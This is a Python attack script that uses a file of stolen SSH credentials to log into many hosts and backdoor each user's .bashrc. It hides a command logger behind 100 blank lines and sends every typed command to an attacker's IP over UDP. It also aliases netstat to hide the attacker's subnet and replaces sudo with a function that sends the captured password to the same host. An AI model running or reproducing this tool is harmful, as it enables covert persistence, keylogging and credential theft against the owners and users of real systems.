import paramiko
import re
import socket
import threading
from multiprocessing.pool import ThreadPool
import argparse

pool = ThreadPool(processes=32)
badhosts = []
g_ipaddr = "" 
g_port = 1337

def sshConnect(item):
    global badhosts

    host, user, password = item[0], item[1], item[2]
    if host in badhosts:
        print(f"[!] Skipping dead host: {host}")
        return
    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, password=password, timeout=30, look_for_keys=False)
        stdin, stdout, stderr = client.exec_command('cd ~/')
        stdin, stdout, stderr = client.exec_command('cat ~/.bashrc')
        print(f"[+] Good connection to {host} on 22")
        output = stdout.read().decode()
        if "export PROMPT_COMMAND='RETRN_VAL" not in output:
            print(f"[+] {host} - {user} logging command not in place")
            ftp_client= client.open_sftp()
            ftp_client.get(".bashrc", f"/tmp/{host}.{user}.bashrc")

            #Logging commands to our server
            bd_cmd = f"""export PROMPT_COMMAND='RETRN_VAL=$?;echo "$(hostname -I)- $(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" ) [$RETRN_VAL]" > /dev/udp/{g_ipaddr}/{g_port}'"""
            with open(f"/tmp/{host}.{user}.bashrc", "a")as f:
                f.write("\n"*100)
                f.write(bd_cmd)

            #Hiding our IP range/subnet from user netstat
            t_ipaddr = ".".join(g_ipaddr.split(".")[0:-1])
            t_ipaddr += "."
            bd_cmd = f"""
            netstat_replacement () {{
                netstat "$@" | grep -v {t_ipaddr}
            }}
            alias netstat=netstat_replacement
            """
            with open(f"/tmp/{host}.{user}.bashrc", "a")as f:
                f.write(bd_cmd)

            #Capture sudo passwords
            bd_cmd = f"""
            function sudo () {{
                realsudo="$(which sudo)"
                read -s -p "[sudo] password for $USER: " inputPasswd
                echo "$(hostname -I)- $(whoami) - sudo - $inputPasswd" > /dev/udp/{g_ipaddr}/{g_port}
                $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1
                $realsudo "${{@:1}}"
            }}  
            """
            with open(f"/tmp/{host}.{user}.bashrc", "a")as f:
                f.write(bd_cmd)

            
            ftp_client.put(f"/tmp/{host}.{user}.bashrc",".bashrc")
            ftp_client.close()
            print(f"[+] {host} - {user} logging uploaded")
        elif "export PROMPT_COMMAND='RETRN_VAL" in output:
            print(f"[+] {host} - {user} logging in place")

        print(f"[+] Closing connection to {host}")
        client.close()
    except paramiko.ssh_exception.NoValidConnectionsError as e:
        print(f"[!] Cannot connect to {host} on 22")
        badhosts.append(host)
        #print(e)
    except socket.timeout as e:
        print(f"[!] Conection timed out to {host} on 22")
        #print(e)
    except IOError as e:
        print(f"[!] IOError on {host}. Error: {e}")

def main():
    global pool, g_ipaddr, g_port

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("--destip", dest="destip", help='IP address that the logs should be sent to', required=True)
    arg_parser.add_argument("--destport", dest="destport", help='Port that the logs should be sent to', required=True)
    args = arg_parser.parse_args()

    g_ipaddr = args.destip
    g_port = args.destport

    objs = []
    for line in open("valid_creds.txt", "r").readlines():
        if len(line) < 3: continue

        m = re.match(r'.*host: (.*) login: (.*) password: (.*).*', line)
        host = m.group(1).strip()
        user = m.group(2).strip()
        password = m.group(3).strip()
        objs.append([host, user, password])
        #rint(host, user, password)

    results = pool.map(sshConnect, objs)
    pool.close()
    pool.join()


if __name__ == "__main__":
    main()
